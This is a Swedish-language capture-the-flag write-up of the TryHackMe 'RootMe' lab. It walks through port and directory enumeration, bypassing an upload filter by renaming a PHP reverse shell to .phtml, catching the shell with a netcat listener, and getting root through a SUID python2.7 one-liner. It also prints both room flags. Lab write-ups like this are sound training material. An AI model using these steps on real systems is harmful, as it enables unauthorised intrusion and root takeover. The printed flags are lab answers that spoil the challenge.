# Root Me

## Enumeration

### nmap scan
```bash
nmap -sC -sV 10.114.145.197
```
Scannar öppna portar, scripts och versioner

Resultat
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
SSH(PORT 22) och HTTP(PORT 80) är öppna. Jag går vidare med att enumerera HTTP-sidan.

### HTTP
Jag möttes av en sida med texten "Can you root me?". Sidans HTML source code visade inget intressant. 

Jag går vidare med att använda gobuster för att hitta gömda directories. 
```bash
gobuster dir -u http://10.114.145.197/ -w /usr/share/wordlists/dirb/common.txt -r
```
Resultat
```
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/css                  (Status: 200) [Size: 1127]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 200) [Size: 960]
/panel                (Status: 200) [Size: 732]
/server-status        (Status: 403) [Size: 279]
/uploads              (Status: 200) [Size: 745]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
## Inital Access
/panel var en sida där man kan ladda upp filer. Min hypotes var att dessa filer hamnar på /uploads så jag testade att ladda upp en test.txt fil. 
Det stämde och test.txt fanns nu på /uploads. 

Detta betyder att jag kan ladda upp ett reverse shell script som sedan körs utav servern. Jag använde pentestmonkeys php reverse shell från github. 

Jag försökte ladda upp min shell.php men sidan tillät inte .php filer att laddas upp. Min lösning på detta var att byta från shell.php till shell.phtml. (.phtml är en alternativ filändelse för php.) 

Detta funkade eftersom filer med en .php filändelse är blockerat från att laddas upp. Men det var tillåtet att ladda upp alternativa filändelser.

Jag startade sedan en lyssnare på min maskins port 4444. Reverse shell skriptet kopplar tillbaka till min lyssnare på port 4444 när det körs.
```bash
nc -lvnp 4444
```
Efter jag körde shell.phtml på /uploads fick jag ett shell i min terminal. För att verifiera detta så använde jag whoami.
```
$ whoami
www-data
```
Inuti /var/www/ så hittade jag user.txt
```
THM{y0u_g0t_a_sh3ll}
```
## Privilege Escalation
Började med att kolla vilka filer som kan köras med SUID permissions.
```bash
find / -type f -perm -u=s -ls 2>/dev/null
```
Resultat
```
   789259     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   787652    156 -rwsr-xr-x   1 root     root         159304 Jan 15  2025 /usr/lib/snapd/snap-confine
   943221    848 -rwsr-xr-x   1 root     root         866448 Feb  4  2022 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   786837     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   794108    468 -rwsr-xr-x   1 root     root         477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
   807579     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   790600     44 -rwsr-xr-x   1 root     root          41552 Feb  6  2024 /usr/bin/newuidmap
   790599     48 -rwsr-xr-x   1 root     root          45648 Feb  6  2024 /usr/bin/newgidmap
   790494     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
   794694   3576 -rwsr-xr-x   1 root     root        3657904 Dec  9  2024 /usr/bin/python2.7
   786902     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
   786526     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
   790497     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
   787492    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
   787586     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
   790893     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
   807577     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
       66     40 -rwsr-xr-x   1 root     root          40152 Oct 10  2019 /snap/core/8268/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/8268/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/8268/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/8268/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Oct 10  2019 /snap/core/8268/bin/umount
     2665     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
     2667     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
     2743     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
     2835     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
     2848     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
     2958    134 -rwsr-xr-x   1 root     root         136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
     3057     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3427    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
     6462    105 -rwsr-sr-x   1 root     root              106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
     7636    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/9665/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/9665/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/9665/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/9665/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/9665/bin/umount
     2605     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
     2607     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
     2683     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
     2775     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
     2788     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
     2898    134 -rwsr-xr-x   1 root     root              136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
     2997     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3367    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
     6405    109 -rwsr-xr-x   1 root     root              110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
     7582    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
      875     84 -rwsr-xr-x   1 root     root               85064 Feb  6  2024 /snap/core20/2599/usr/bin/chfn
      881     52 -rwsr-xr-x   1 root     root               53040 Feb  6  2024 /snap/core20/2599/usr/bin/chsh
      951     87 -rwsr-xr-x   1 root     root               88464 Feb  6  2024 /snap/core20/2599/usr/bin/gpasswd
     1035     55 -rwsr-xr-x   1 root     root               55528 Apr  9  2024 /snap/core20/2599/usr/bin/mount
     1044     44 -rwsr-xr-x   1 root     root               44784 Feb  6  2024 /snap/core20/2599/usr/bin/newgrp
     1059     67 -rwsr-xr-x   1 root     root               68208 Feb  6  2024 /snap/core20/2599/usr/bin/passwd
     1169     67 -rwsr-xr-x   1 root     root               67816 Apr  9  2024 /snap/core20/2599/usr/bin/su
     1170    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/2599/usr/bin/sudo
     1228     39 -rwsr-xr-x   1 root     root               39144 Apr  9  2024 /snap/core20/2599/usr/bin/umount
     1317     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1691    467 -rwsr-xr-x   1 root     root              477672 Apr 11  2025 /snap/core20/2599/usr/lib/openssh/ssh-keysign
   786555     56 -rwsr-xr-x   1 root     root               55528 Apr  9  2024 /bin/mount
   794512     68 -rwsr-xr-x   1 root     root               67816 Apr  9  2024 /bin/su
   786560     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /bin/fusermount
   786557     40 -rwsr-xr-x   1 root     root               39144 Apr  9  2024 /bin/umount
```
/usr/bin/python2.7 är intressant. Det är en klassisk SUID misconfiguration som möjliggör privilege escalation. 

På GTFObins hittade jag denna payload som utnyttjar att binary körs med root privilegier.
```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
För att kolla ifall payloaden funkade så körde jag whoami
```
whoami
root
```
Inuti /root så hittade jag root.txt
```
THM{pr1v1l3g3_3sc4l4t10n}
```
## Länk till rummet
https://tryhackme.com/room/rrootme
